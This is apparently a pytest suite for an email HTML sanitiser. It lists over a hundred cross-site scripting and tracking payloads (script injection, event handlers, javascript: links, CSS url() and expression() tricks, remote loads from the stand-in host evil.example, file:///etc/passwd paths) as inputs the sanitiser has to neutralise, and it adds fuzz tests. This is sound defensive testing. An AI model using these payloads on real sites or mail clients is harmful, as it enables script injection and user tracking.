"""Adversarial tests for the HTML sanitiser."""

from __future__ import annotations

import base64

import pytest
from html_checks import inspect, problems
from hypothesis import given, settings
from hypothesis import strategies as st

from triage.mime import (
    BLOCKED_SRC_ATTRIBUTE,
    MAX_INLINE_IMAGE_BYTES,
    filter_style,
    limit_html_depth,
    sanitize_html,
)

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
PNG_URI = "data:image/png;base64," + base64.b64encode(PNG).decode()


def clean(html: str, **kwargs) -> str:
    return sanitize_html(html, **kwargs).html


# Each of these would run script or contact a server if it survived. Collected from the usual
# lists of cross-site scripting and email tracking vectors.
ATTACKS = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=alert(1)>",
    "<img src=\"x\" OnErRoR='alert(1)'>",
    "<img src=https://evil.example/pixel.gif>",
    "<img src=//evil.example/pixel.gif>",
    "<img src='http://evil.example/p.gif' srcset='http://evil.example/2x.gif 2x'>",
    "<img srcset='http://evil.example/2x.gif 2x'>",
    "<img src=' https://evil.example/p.gif'>",
    "<img src='ht\ntps://evil.example/p.gif'>",
    "<img src='file:///etc/passwd'>",
    "<img src='ftp://evil.example/x'>",
    "<img src=x:y lowsrc=http://evil.example/a dynsrc=http://evil.example/b>",
    "<img src='data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='>",
    "<img src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
    "<img src='data:image/png;base64,AAAA\" onerror=\"alert(1)'>",
    "<img src='data:image/png,http://evil.example/'>",
    "<img longdesc='http://evil.example/' usemap='#m'>",
    "<image src=http://evil.example/x>",
    "<picture><source srcset='http://evil.example/x'><img src='http://evil.example/y'></picture>",
    "<a href='javascript:alert(1)'>x</a>",
    "<a href='JaVaScRiPt:alert(1)'>x</a>",
    "<a href='java\tscript:alert(1)'>x</a>",
    "<a href=' javascript:alert(1)'>x</a>",
    "<a href='&#106;avascript:alert(1)'>x</a>",
    "<a href='&#x6A;&#x61;vascript&colon;alert(1)'>x</a>",
    "<a href='vbscript:msgbox(1)'>x</a>",
    "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
    "<a href='file:///etc/passwd'>x</a>",
    "<a href='//evil.example/'>x</a>",
    "<a href='/relative'>x</a>",
    "<a href='https://ok.example/' ping='http://evil.example/ping'>x</a>",
    "<a href='https://ok.example/' target='_top' rel='opener'>x</a>",
    "<a href='https://ok.example/' onclick='alert(1)' onmouseover='alert(2)'>x</a>",
    "<a xlink:href='javascript:alert(1)'>x</a>",
    "<body onload=alert(1) background='http://evil.example/bg.png'>hi</body>",
    "<table background='http://evil.example/bg.png'><tr><td background='http://evil.example/'>x</td></tr></table>",
    "<div style='background:url(http://evil.example/x)'>x</div>",
    "<div style='background-image: URL( \"http://evil.example/x\" )'>x</div>",
    "<div style='background:u\\72l(http://evil.example/x)'>x</div>",
    "<div style='background:url&#40;http://evil.example/x&#41;'>x</div>",
    "<div style='color:red;/**/background:url(http://evil.example/x)'>x</div>",
    "<div style='width:expression(alert(1))'>x</div>",
    "<div style='behavior:url(evil.htc)'>x</div>",
    "<div style='-moz-binding:url(http://evil.example/x.xml#x)'>x</div>",
    "<div style='list-style-image:url(http://evil.example/x)'>x</div>",
    "<div style='content:url(http://evil.example/x)'>x</div>",
    "<div style='cursor:url(http://evil.example/x),auto'>x</div>",
    "<div style='font-family:x;src:url(http://evil.example/x)'>x</div>",
    "<div style='background:image-set(\"http://evil.example/x\" 1x)'>x</div>",
    "<div style='color:red;} body{background:url(http://evil.example/x)'>x</div>",
    "<div style='color: var(--x); --x: url(http://evil.example/)'>x</div>",
    '<div style="font-family: \'a; background: url(http://evil.example/x)">x</div>',
    "<div style='@import \"http://evil.example/x.css\"'>x</div>",
    "<style>@import url(http://evil.example/x.css);</style>",
    "<style>body{background:url(http://evil.example/x)}</style>",
    "<style><!-- </style><img src=x onerror=alert(1)> --></style>",
    "<link rel=stylesheet href=http://evil.example/x.css>",
    "<link rel=prefetch href=http://evil.example/x>",
    "<link rel=dns-prefetch href=//evil.example>",
    "<meta http-equiv=refresh content='0;url=http://evil.example/'>",
    "<meta http-equiv=x-dns-prefetch-control content=on>",
    "<base href='http://evil.example/'>",
    "<iframe src='http://evil.example/'></iframe>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<frameset><frame src='http://evil.example/'></frameset>",
    "<object data='http://evil.example/x.swf'></object>",
    "<embed src='http://evil.example/x.swf'>",
    "<applet code='Evil.class' codebase='http://evil.example/'></applet>",
    "<video src='http://evil.example/x.mp4' poster='http://evil.example/p.png'></video>",
    "<audio src='http://evil.example/x.mp3' autoplay></audio>",
    "<video><source src='http://evil.example/x.mp4'><track src='http://evil.example/t.vtt'></video>",
    "<form action='http://evil.example/'><input name=a value=b><input type=image src='http://evil.example/i.png'><button formaction='http://evil.example/'>go</button></form>",
    "<input type=image src=http://evil.example/x.png>",
    "<button onclick=alert(1)>x</button>",
    "<select onchange=alert(1)><option>x</option></select>",
    "<textarea onfocus=alert(1) autofocus>x</textarea>",
    "<details open ontoggle=alert(1)>x</details>",
    "<marquee onstart=alert(1)>x</marquee>",
    "<svg onload=alert(1)><image href='http://evil.example/x.png'/></svg>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><use href='http://evil.example/x.svg#a'/></svg>",
    "<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>",
    "<svg><style>*{background:url(http://evil.example/x)}</style></svg>",
    "<svg><foreignObject><img src=http://evil.example/x></foreignObject></svg>",
    "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
    "<math><annotation-xml encoding='text/html'><img src=http://evil.example/x></annotation-xml></math>",
    "<math><mtext><table><mglyph><style><!--</style><img title='--&gt;&lt;img src=1 onerror=alert(1)&gt;'>",
    "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
    "<template><img src=http://evil.example/x></template>",
    "<xmp><img src=http://evil.example/x></xmp>",
    "<plaintext><img src=http://evil.example/x>",
    "<title><img src=http://evil.example/x></title>",
    "<!--[if gte mso 9]><img src=http://evil.example/x><![endif]-->",
    "<!--><img src=http://evil.example/x>-->",
    "<![CDATA[<img src=http://evil.example/x>]]>",
    "<?xml-stylesheet href='http://evil.example/x.css'?>",
    "<!DOCTYPE html SYSTEM 'http://evil.example/x.dtd'>",
    "<div id=x name=y contenteditable draggable=true tabindex=1 accesskey=x>x</div>",
    "<img alt='x' src='cid:unknown'>",
    "<img src='cid:../../etc/passwd'>",
    "<img src='triage-blocked:'>",
    f"<img {BLOCKED_SRC_ATTRIBUTE}='x' data-other='y' src='https://evil.example/'>",
    "<p title=' src=\"triage-blocked:\"'>x</p>",
    "<a href='https://ok.example/' style='color:red' title=\"x' onmouseover='alert(1)\">x</a>",
    "<p class='x\" onmouseover=\"alert(1)'>x</p>",
    "<p lang='en\"><script>alert(1)</script>'>x</p>",
    "<font face='x\" onmouseover=\"alert(1)' color='red;background:url(http://evil.example/)' size='7\" onclick=\"x'>x</font>",
    "<td width='100\" onmouseover=\"alert(1)' bgcolor='url(http://evil.example/)'>x</td>",
    "<ol type='a\" onclick=\"x' start='1 onclick=x'><li>x</li></ol>",
    "<p dir='rtl\" onclick=\"x' align='left;background:url(x)'>x</p>",
    "<\x00script>alert(1)</script>",
    "<img src=\x00http://evil.example/x>",
    "<a href='\x01javascript:alert(1)'>x</a>",
    "<a href='https://ok.example/\n@evil.example/'>x</a>",
]


@pytest.mark.parametrize("attack", ATTACKS)
def test_attack_is_neutralised(attack: str) -> None:
    result = sanitize_html(attack, {})
    assert problems(result.html) == []
    # Nothing that mentions the attacker's server may sit inside a tag.
    for tag, name, value in inspect(result.html).attributes:
        if name in ("alt", "title", "class", "lang"):
            continue  # inert text
        assert "evil.example" not in value.lower(), (tag, name, value)


@pytest.mark.parametrize(
    "unsafe",
    [
        "<script>alert(1)</script>",
        "<p onclick='x'>t</p>",
        "<img src='https://evil.example/x.gif'>",
        "<img src='data:image/svg+xml;base64,AAAA'>",
        "<a href='javascript:alert(1)'>x</a>",
        "<a href='/relative'>x</a>",
        "<a href='https://ok.example/' target='_top'>x</a>",
        "<p style='background: url(x)'>t</p>",
        "<p style='color: r\\65 d'>t</p>",
        "<td background='x'>t</td>",
        "<td width='1\" x'>t</td>",
        "<iframe></iframe>",
        "<!-- comment -->",
        "<svg></svg>",
        "<p id='x'>t</p>",
    ],
)
def test_the_checker_itself_notices_unsafe_markup(unsafe: str) -> None:
    """Guards against the tests below passing because the checker is blind."""
    assert problems(unsafe) != []


def test_scripts_and_styles_are_removed_with_their_content() -> None:
    html = clean(
        "<p>before</p><script>secret_script()</script><style>.x{color:red}</style>"
        "<title>Title text</title><noscript>ns</noscript><textarea>ta</textarea><p>after</p>"
    )
    assert html == "<p>before</p><p>after</p>"


def test_ordinary_formatting_survives() -> None:
    html = clean(
        '<div dir="ltr"><h1 style="font-size: 20px; color: #333333">Title</h1>'
        '<p align="center">Some <b>bold</b>, <i>italic</i> and <u>underlined</u> text.</p>'
        '<table width="100%" border="0" cellpadding="4" cellspacing="0" bgcolor="#ffffff">'
        '<tr valign="top"><td colspan="2" width="50%">cell</td></tr></table>'
        '<ul><li>one</li></ul><ol start="3" type="a"><li>two</li></ol>'
        '<blockquote class="gmail_quote">quoted</blockquote>'
        '<font face="Arial, Helvetica" color="red" size="2">old school</font><br><hr></div>'
    )
    for expected in (
        '<h1 style="font-size: 20px; color: #333333">Title</h1>',
        '<p align="center">',
        "<b>bold</b>",
        'cellpadding="4"',
        'bgcolor="#ffffff"',
        '<td colspan="2" width="50%">cell</td>',
        '<ol start="3" type="a">',
        '<blockquote class="gmail_quote">quoted</blockquote>',
        'face="Arial, Helvetica"',
        'color="red"',
        'size="2"',
    ):
        assert expected in html, expected
    assert problems(html) == []


def test_links() -> None:
    html = clean(
        '<a href="https://ok.example/path?a=1&amp;b=2#frag">one</a>'
        '<a href="HTTP://OK.EXAMPLE/">two</a>'
        '<a href="mailto:kim@example.net?subject=Hi">three</a>'
        '<a href="https://ok.example/with space">four</a>'
        '<a href="tel:+15550100">five</a><a name="anchor">six</a>'
    )
    links = [(value) for tag, name, value in inspect(html).attributes if name == "href"]
    assert links == [
        "https://ok.example/path?a=1&b=2#frag",
        "HTTP://OK.EXAMPLE/",
        "mailto:kim@example.net?subject=Hi",
        "https://ok.example/with%20space",
    ]
    assert html.count('target="_blank"') == 6
    assert html.count('rel="noopener noreferrer"') == 6
    for text in ("one", "two", "three", "four", "five", "six"):
        assert f">{text}</a>" in html


def test_remote_images_are_blocked_and_counted() -> None:
    result = sanitize_html(
        '<p><img src="https://tracker.example/a.gif" alt="logo" width="1" height="1">'
        '<img src="http://tracker.example/b.gif"><img src="//tracker.example/c.gif">'
        '<img alt="no source"></p>'
    )
    assert result.blocked_remote_content == 3
    assert result.html.count(f'{BLOCKED_SRC_ATTRIBUTE}=""') == 3
    assert "tracker.example" not in result.html
    assert 'alt="logo"' in result.html
    assert problems(result.html) == []
    assert sanitize_html("<p>plain</p>").blocked_remote_content == 0


def test_cid_images_are_inlined() -> None:
    images = {
        "logo@example": ("image/png", PNG),
        "vector@example": ("image/svg+xml", b"<svg onload='alert(1)'/>"),
        "huge@example": ("image/png", b"\x00" * (MAX_INLINE_IMAGE_BYTES + 1)),
    }
    result = sanitize_html(
        '<img src="cid:logo@example" alt="Logo"><img src="CID:logo@example">'
        '<img src="cid:vector@example"><img src="cid:huge@example"><img src="cid:missing">',
        images,
    )
    assert result.html.count(f'src="{PNG_URI}"') == 2
    assert "svg" not in result.html
    assert result.html.count("<img") == 5
    assert result.html.count("src=") == 2
    assert result.blocked_remote_content == 0
    assert problems(result.html) == []


def test_inline_images_have_a_total_size_cap() -> None:
    big = b"\x01" * (MAX_INLINE_IMAGE_BYTES - 10)
    images = {f"i{n}": ("image/png", big) for n in range(12)}
    html = "".join(f'<img src="cid:i{n}">' for n in range(12))
    result = sanitize_html(html, images)
    assert 1 <= result.html.count("src=") <= 8
    assert len(result.html) < 13_000_000


def test_embedded_data_images() -> None:
    html = clean(
        f'<img src="{PNG_URI}"><img src="data:image/png;base64,{"AAAA" * 3}\n{"AAAA" * 3}">'
        '<img src="data:image/png;base64,not base64!">'
        '<img src="data:image/png;base64,AAA">'
        '<img src="data:IMAGE/PNG;base64,AAAA">'
        '<img src="data:image/png;charset=utf-8;base64,AAAA">'
    )
    assert html.count("src=") == 2
    assert f'src="{PNG_URI}"' in html
    assert problems(html) == []


def test_blocked_marker_cannot_be_forged_or_confused() -> None:
    # Text that merely looks like the internal sentinel stays text.
    html = clean('<p>literal src="triage-blocked:" in text</p>')
    assert inspect(html).tags == ["p"]
    assert inspect(html).attributes == []
    # The marker attribute cannot be supplied by the message itself.
    html = clean(f'<img {BLOCKED_SRC_ATTRIBUTE}="x" alt="a"><p {BLOCKED_SRC_ATTRIBUTE}="y">t</p>')
    assert BLOCKED_SRC_ATTRIBUTE not in html


@pytest.mark.parametrize(
    ("style", "expected"),
    [
        ("color: red", "color: red"),
        ("COLOR:RED;;  font-weight : bold ;", "color: RED; font-weight: bold"),
        ("color: rgb(1, 2, 3); background-color: RGBA(0,0,0,.5)", None),
        (
            "font-family: 'Helvetica Neue', \"Arial\", sans-serif",
            "font-family: Helvetica Neue, Arial, sans-serif",
        ),
        ("font: italic bold 12px/1.5 Georgia, serif", "font: italic bold 12px/1.5 Georgia, serif"),
        ("margin: 0 auto !important; padding: -1px 2em 3% 4pt", None),
        ("background: #fff", "background: #fff"),
        ("background: #fff url(http://evil.example/x)", ""),
        ("background: url( 'http://evil.example/x' )", ""),
        ("background-image: url(http://evil.example/x)", ""),
        ("position: fixed; top: 0; z-index: 9999; color: blue", "color: blue"),
        ("color: red; behavior: url(x.htc); width: 10px", "color: red; width: 10px"),
        ("width: expression(alert(1))", ""),
        ("width: calc(100% - 10px)", ""),
        ("color: var(--x)", ""),
        ("width: attr(data-x)", ""),
        ("color: r\\65 d", ""),
        ("color: red /* comment */", ""),
        ("color: red; @import 'x'", "color: red"),
        ("color: red} body {color: blue", ""),
        ("color: <b>", ""),
        ("color: red\x00", ""),
        ("color", ""),
        ("", ""),
        ("x" * 20_000, ""),
    ],
)
def test_filter_style(style: str, expected: str | None) -> None:
    result = filter_style(style) or ""
    if expected is None:
        assert result.count(":") == style.count(":")  # everything was kept
    else:
        assert result == expected
    assert "url" not in result.lower()
    assert "\\" not in result
    assert "@" not in result


def test_huge_and_deeply_nested_input_is_handled() -> None:
    deep = sanitize_html("<div>" * 5000 + "x" + "</div>" * 5000)
    assert deep.truncated
    assert deep.html.count("<div>") == 500
    assert problems(deep.html) == []
    wide = sanitize_html("<p>hello</p>" * 200_000)
    assert wide.truncated
    assert len(wide.html) <= 1_100_000
    assert problems(clean("<" * 50_000)) == []
    assert not sanitize_html("<div><p>fine</p></div>" * 1000).truncated


@pytest.mark.parametrize(
    ("html", "cut"),
    [
        ("<div>" * 10, False),
        ("<div>" * 501, True),
        ("<div></div>" * 5000, False),
        ("<p><li><td><tr><br><img>" * 5000, False),  # closed implicitly, or have no content
        ("<DIV><Span></SPAN></div>" * 5000, False),
        ("<div></span>" * 5000, True),  # an end tag that closes nothing does not count
        ("<span><div></span>" * 5000, True),
        ("<div><div></div>" * 501, True),
        ("<b><i>" * 251, True),
        ("text < not a tag " * 5000, False),
    ],
)
def test_limit_html_depth(html: str, cut: bool) -> None:
    limited, was_cut = limit_html_depth(html)
    assert was_cut == cut
    if cut:
        assert len(limited) < len(html)
        assert html.startswith(limited)
        assert limit_html_depth(limited) == (limited, False)
    else:
        assert limited == html


# Fragments from which hypothesis assembles hostile markup.
_PIECES = st.sampled_from(
    [
        "<", ">", "</", "/>", "=", '"', "'", "`", " ", "\n", "\t", "\x00", "&", ";", "&#", "&lt;",
        "&quot;", "\\", "/*", "*/", "<!--", "-->", "<![CDATA[", "]]>", "<?", "?>",
        "script", "style", "img", "a", "svg", "math", "iframe", "table", "td", "div", "p", "font",
        "body", "link", "meta", "base", "form", "input", "object", "embed", "noscript", "template",
        "textarea", "title", "xmp", "plaintext", "select", "annotation-xml", "foreignObject",
        "src", "href", "srcset", "style", "background", "onerror", "onload", "onclick", "poster",
        "xlink:href", "formaction", "action", "data", "class", "title", "alt", "width", "color",
        "http://evil.example/x", "https://evil.example/x", "//evil.example/x", "javascript:",
        "data:image/png;base64,AAAA", "data:text/html,", "cid:logo", "mailto:a@example.org",
        "url(", ")", "expression(", "@import", "color:red", "background:", "triage-blocked:",
        "data-triage-blocked-src", "alert(1)", "x",
    ]
)  # fmt: skip


@settings(max_examples=1500, deadline=None)
@given(st.lists(_PIECES, max_size=40).map("".join))
def test_assembled_markup_is_always_safe(html: str) -> None:
    result = sanitize_html(html, {"logo": ("image/png", PNG)})
    found = problems(result.html)
    assert found == [], (html, result.html)
    for _tag, name, value in inspect(result.html).attributes:
        if name not in ("alt", "title", "class", "lang"):
            assert "evil.example" not in value


@settings(max_examples=500, deadline=None)
@given(st.text(max_size=300))
def test_arbitrary_text_is_always_safe(html: str) -> None:
    assert problems(sanitize_html(html).html) == []


@settings(max_examples=500, deadline=None)
@given(st.text(alphabet=st.characters(codec="ascii"), max_size=200))
def test_filter_style_never_lets_a_url_through(style: str) -> None:
    result = filter_style(style) or ""
    assert "\\" not in result
    assert "@" not in result
    assert "url(" not in result.lower().replace(" ", "")
    assert '"' not in result
    assert "'" not in result
